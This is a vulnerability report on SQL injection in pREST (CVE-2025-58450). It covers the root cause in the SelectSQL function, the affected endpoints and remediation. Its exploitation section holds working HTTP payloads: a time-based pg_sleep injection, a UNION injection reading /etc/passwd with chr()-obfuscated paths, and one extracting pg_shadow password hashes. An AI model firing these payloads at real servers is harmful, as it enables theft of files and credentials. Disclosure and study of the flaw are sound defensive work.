# CVE-2025-58450 Vulnerability Report

## Overview

pREST (PostgreSQL REST) versions prior to 2.0.0-rc3 contain systemic SQL injection vulnerabilities. The vulnerability exists because user-controlled path parameters (database, schema, table names) are directly concatenated into SQL queries without proper validation or sanitization.

## Affected Component

- **Software**: pREST (PostgreSQL REST API)
- **Affected Versions**: < v2.0.0-rc3
- **Tested Version**: v1.5.3

## Vulnerability Details

### Root Cause

The `SelectSQL` function in `adapters/postgres/postgres.go` constructs SQL queries using string concatenation with unvalidated user input:

```go
func (adapter *Postgres) SelectSQL(selectStr string, database string, schema string, table string) string {
    return fmt.Sprintf(`%s "%s"."%s"."%s"`, selectStr, database, schema, table)
}
```

### Affected Endpoints

- GET `/{database}/{schema}/{table}`
- POST `/{database}/{schema}/{table}`
- PUT/PATCH `/{database}/{schema}/{table}`
- DELETE `/{database}/{schema}/{table}`

## Exploitation

### Time-Based SQL Injection

Payload:
```
GET /db001/api"."todos" where (select 1 from pg_sleep(5))=1) s--/todos
```

URL Encoded:
```
GET /db001/api%22.%22todos%22%20where%20(select%201%20from%20pg_sleep(5))=1)%20s--/todos
```

### File Read via UNION Injection

Reading `/etc/passwd`:
```
GET /db001/api"."todos" union select pg_read_file(chr(47)||chr(101)||chr(116)||chr(99)||chr(47)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(100))) s--/todos?_select=task
```

### Reading PostgreSQL Password Hashes

```
GET /db001/api"."todos" union select passwd from pg_shadow) s--/todos?_select=task
```

## Impact

- **Severity**: Critical (CVSS 9.3)
- **Attack Vector**: Network
- **Privileges Required**: None (when auth is disabled)

### Potential Impacts

1. **Data Exfiltration**: Read arbitrary database contents
2. **File System Access**: Read files accessible to PostgreSQL process
3. **Credential Theft**: Extract password hashes from pg_shadow
4. **Environment Variable Exposure**: Access secrets stored in environment variables

## Verification Results

| Test | Result |
|------|--------|
| Time-based SQLi | SUCCESS |
| File Read (/etc/passwd) | SUCCESS |
| Database Table Access | SUCCESS |
| PostgreSQL Hash Extraction | SUCCESS |

## Remediation

- Upgrade to pREST v2.0.0-rc3 or later
- Enable authentication if using vulnerable versions
- Restrict database user privileges
- Implement network-level access controls
